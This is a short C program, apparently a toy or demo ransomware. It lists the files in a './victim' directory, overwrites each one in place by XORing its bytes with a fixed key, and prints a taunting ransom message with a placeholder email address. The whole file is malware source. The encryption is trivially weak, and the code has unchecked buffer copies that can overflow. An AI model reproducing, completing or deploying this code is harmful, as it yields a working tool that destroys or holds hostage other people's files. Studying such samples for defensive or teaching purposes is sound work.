#include <stdio.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int encrypt_file(char dirpath[], char filename[]) {
    char fullpath[128];
    sprintf(fullpath, "%s/%s", dirpath, filename);
    printf("%s\n", fullpath);
    FILE* fp = fopen(fullpath ,"rb+");

    if(fp == NULL) {
        fputs("File cannot open.\n", stderr);
        exit(1);
    }

    int tmp_r;

    while(fread(&tmp_r, sizeof(tmp_r), 1, fp) > 0) {
        printf( "%d\n", tmp_r);
        fseek(fp, -sizeof(tmp_r), SEEK_CUR);
        int key = 9876543;
        int tmp_w = tmp_r ^ key;
        fwrite(&tmp_w, sizeof(key), 1, fp);
        printf( "%d\n", tmp_w);
    }
    fclose(fp);

    return 0;
}

int main(){
    DIR *dir;
    struct dirent *dp;
    char dirpath[] = "./victim";

    dir = opendir(dirpath);
    if(dir == NULL) {
        return 1;
    } else {
    }

    dp = readdir(dir);
    while(dp != NULL) {
        struct stat st;
        int result;
        result = stat(dp->d_name, &st);

        if(dp->d_type != DT_DIR) {
            printf("File: %s\n", dp->d_name);
            char filename[128];
            memcpy(filename, dp->d_name, strlen(dp->d_name)+1);
            encrypt_file(dirpath, filename);
        } else {
        }

        dp = readdir(dir);
    }

    closedir(dir);

    printf("Hahaha! Your ID: 12345\nEmail me! hoge@hogehoge.com\n");

    int a;
    int b;
    a = 3;
    b = 4;
    a = b - 1 + 2;
    return 0;
}